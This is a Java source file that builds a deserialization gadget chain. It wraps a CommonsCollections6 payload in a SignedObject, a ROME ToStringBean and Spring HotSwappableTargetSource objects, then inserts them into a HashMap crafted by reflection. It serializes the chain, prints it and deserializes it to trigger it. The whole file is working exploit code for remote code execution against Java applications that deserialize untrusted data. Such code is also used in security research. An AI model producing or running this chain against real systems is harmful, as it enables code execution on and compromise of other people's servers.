package com.example;

import com.sun.org.apache.xpath.internal.objects.XString;
import com.sun.syndication.feed.impl.ToStringBean;
import org.springframework.aop.target.HotSwappableTargetSource;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.HashMap;

public class RomeXStringChain {
    public static void main(String[] args) throws Exception {
        KeyPairGenerator kpg = KeyPairGenerator.getInstance("DSA");
        kpg.initialize(1024);
        KeyPair kp = kpg.generateKeyPair();
        SignedObject signedObject=new SignedObject(Gadget_CC6.getPayload(), kp.getPrivate(), Signature.getInstance("DSA"));

        ToStringBean toStringBean = new ToStringBean(SignedObject.class, signedObject);

        HotSwappableTargetSource h1 = new HotSwappableTargetSource(toStringBean);
        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new XString("xxx"));

        HashMap<Object,Object> hashMap = makeMap(h1,h2);

        String barr = Utils.Serialize(hashMap);
        System.out.println(barr);
        Utils.UnSerialize(barr);
    }

    public static HashMap<Object, Object> makeMap (Object v1, Object v2 ) throws Exception {
        HashMap<Object, Object> s = new HashMap<>();
        Utils.SetValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Utils.SetValue(s, "table", tbl);
        return s;
    }
}
